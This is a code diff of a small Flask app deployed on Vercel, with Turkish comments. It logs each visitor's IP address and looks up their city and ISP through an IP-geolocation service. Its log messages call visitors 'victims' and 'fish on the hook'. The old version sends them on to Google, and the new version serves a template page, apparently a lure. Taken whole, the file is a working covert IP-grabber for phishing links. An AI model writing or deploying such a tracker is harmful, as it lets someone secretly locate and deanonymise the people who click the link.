@@ -1,28 +1,24 @@
-from flask import Flask, request, redirect
+from flask import Flask, render_template, request
 import requests
 
-app = Flask(__name__)
+app = Flask(__name__, template_folder='../templates')
 
 @app.route('/')
-def logger():
-    # Vercel gerçek IP'yi 'x-forwarded-for' başlığında taşır
+def index():
+    # IP Yakalama
     ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
     
+    # OSINT
     try:
-        # IP Sorgusu (OSINT)
-        r = requests.get(f"http://ip-api.com/json/{ip}")
-        d = r.json()
-        info = f"{d.get('city')}, {d.get('country')} | {d.get('isp')}"
+        data = requests.get(f"http://ip-api.com/json/{ip}").json()
+        city = data.get('city', '?')
+        isp = data.get('isp', '?')
+        print(f"\n[!!!] BALIK OLTADA: {ip} | {city} | {isp}\n")
     except:
-        info = "Sorgu Hatasi"
+        print(f"\n[!!!] YENI IP: {ip}\n")
 
-    # Logları terminale bas (Vercel Dashboard'da 'Logs' kısmında göreceksin)
-    print(f"\n[!] HEDEF YAKALANDI: {ip}\n[!] DETAY: {info}\n")
-    
-    # Kurbanı yönlendir
-    return redirect("https://www.google.com")
+    return render_template('index.html')
 
-# Vercel için gerekli
 def handler(event, context):
     return app(event, context)
-  
+    
